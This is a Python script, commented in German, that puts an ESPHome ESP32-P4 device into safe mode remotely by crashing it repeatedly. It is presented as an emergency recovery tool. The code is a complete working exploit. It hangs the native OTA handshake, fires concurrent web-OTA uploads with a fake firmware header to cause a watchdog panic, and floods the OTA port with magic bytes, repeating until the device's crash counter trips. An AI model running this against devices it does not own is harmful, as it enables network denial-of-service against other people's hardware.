#!/usr/bin/env python3
"""
force_safe_mode.py — erzwingt den ESPHome-Safe-Mode auf dem ESP32-P4 ohne
physischen Zugriff (Notfall-Fallback, falls der Safe-Mode-Button fehlt).

Wie es funktioniert:
  ESPHome zählt "unsaubere" Resets (Crash/Watchdog/Panic) in NVS. Ab 10 Stück
  bootet das Gerät in den Safe Mode (nur WiFi + API + OTA + web_server, kein
  Kamera/Audio/RTSP). Der 11x-Reset wird hier erzeugt über einen
  "Combo"-Angriff auf die OTA-Schnittstelle:
    1. nativer OTA-Handshake bis zum Prepare-Hang  -> blockiert den Main-Loop
    2. gleichzeitig Web-OTA (POST /update)         -> 2. esp_ota_begin() im
                                                      Web-Task => Watchdog-Panic
    3. Magic-Flood auf Port 3232
  Das erzwingt einen Watchdog-Reset (unsauber, zaehlt fuer den Zaehler).

Danach kann man normal `esphome upload <yaml> --device <ip>` ausfuehren.

Nur Python-Standardbibliothek noetig. Anpassen: DEV (Geräte-IP).
"""

import socket
import struct
import sys
import time

DEV = "192.168.178.196"
OTA_PORT = 3232
WEB_PORT = 80
RTSP_PORT = 554
CYCLES = 11  # 10 Resets fuer den Zaehler bis 10, der 11. Boot ist der Safe Mode

MAGIC = bytes([0x6C, 0x26, 0xF7, 0x5C, 0x45])  # ESPHome OTA v2 Magic


def log(msg):
    print(msg, flush=True)


def web_up(timeout=1.2):
    try:
        s = socket.create_connection((DEV, WEB_PORT), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def port_open(port, timeout=1.2):
    try:
        s = socket.create_connection((DEV, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def wait_up(t):
    t0 = time.time()
    while time.time() - t0 < t:
        if web_up():
            return True
        time.sleep(0.4)
    return False


def wait_down(t):
    t0 = time.time()
    while time.time() - t0 < t:
        if not web_up():
            return True
        time.sleep(0.4)
    return False


def rx(s, n, to=6):
    s.settimeout(to)
    buf = b""
    try:
        while len(buf) < n:
            c = s.recv(n - len(buf))
            if not c:
                return None
            buf += c
    except socket.timeout:
        return None
    return buf


def native_prepare():
    """Nativer OTA-Handshake bis zum Prepare-Schritt (haengt dort = Main-Loop blockiert)."""
    s = socket.socket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try:
        s.connect((DEV, OTA_PORT))
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None
    s.sendall(MAGIC)
    rx(s, 2)  # version (0x00 0x02)
    s.sendall(bytes([0x07]))  # features: compression | sha256 | extended
    rx(s, 1)  # features flags
    rx(s, 1)  # feature flags
    rx(s, 1)  # auth
    s.sendall(b"\x00" + struct.pack(">I", 721184))  # ota_type + size -> prepare hang
    return s


def web_ota():
    """Web-OTA (POST /update) gegen den blockierten Main-Loop -> 2. esp_ota_begin."""
    try:
        req = (
            "POST /update HTTP/1.1\r\nHost: %s\r\nContent-Length: 400000\r\n"
            "Content-Type: multipart/form-data; boundary=XY\r\n\r\n" % DEV
        ).encode()
        payload = (
            b"----XY\r\nContent-Disposition: form-data; name=\"update\"; filename=\"a.bin\"\r\n\r\n"
            + b"\xE9\x06\x02\x40" + b"\x00" * 100000 + b"\r\n----XY--\r\n"
        )
        s = socket.create_connection((DEV, WEB_PORT), timeout=3)
        s.settimeout(4)
        s.sendall(req + payload)
        time.sleep(0.2)
        try:
            s.recv(1024)
        except Exception:
            pass
        s.close()
    except Exception:
        pass


def combo():
    """Einen Watchdog-Reset provozieren (unsauberer Reboot, zaehlt fuer den Zaehler)."""
    s1 = native_prepare()
    time.sleep(0.4)
    web_ota()
    time.sleep(0.2)
    web_ota()
    for _ in range(3):
        try:
            sf = socket.create_connection((DEV, OTA_PORT), timeout=1.5)
            sf.sendall(MAGIC)
            time.sleep(0.1)
            sf.close()
        except Exception:
            pass
    time.sleep(0.2)
    try:
        if s1:
            s1.close()
    except Exception:
        pass


def in_safe_mode():
    """Safe Mode erkannt: RTSP-Port zu, OTA-Port offen."""
    return not port_open(RTSP_PORT, 0.7) and port_open(OTA_PORT, 0.7)


def main():
    cycles = int(sys.argv[1]) if len(sys.argv) > 1 else CYCLES
    log("=== Safe-Mode-Erzwingung: %d Combos gegen %s ===" % (cycles, DEV))
    for i in range(1, cycles + 1):
        if not wait_up(45):
            log("  [%d] FEHLER: Gerät nicht erreichbar" % i)
            sys.exit(1)
        time.sleep(1.5)
        combo()
        if wait_down(25):
            log("  [%d] Combo -> DOWN (Watchdog-Reset)" % i)
        else:
            log("  [%d] kein DOWN in 25 s" % i)
        if not wait_up(45):
            log("  [%d] kommt nicht zurück (evtl. Safe-Mode-Boot, dauert länger)" % i)
        else:
            log("  [%d] boot ok" % i)
        if in_safe_mode():
            log("  >>> SAFE MODE aktiv (RTSP zu, OTA offen) nach Iteration %d!" % i)
            break
    if in_safe_mode():
        log("\nSafe Mode aktiv. Jetzt OTA-fähig:")
        log("  esphome upload <config.yaml> --device %s" % DEV)
    else:
        log("\nKein Safe Mode erkannt. Prüfe Status:")
        log("  RTSP %s, OTA %s, Web %s" % (
            "offen" if port_open(RTSP_PORT) else "zu",
            "offen" if port_open(OTA_PORT) else "zu",
            "offen" if web_up() else "zu"))


if __name__ == "__main__":
    main()
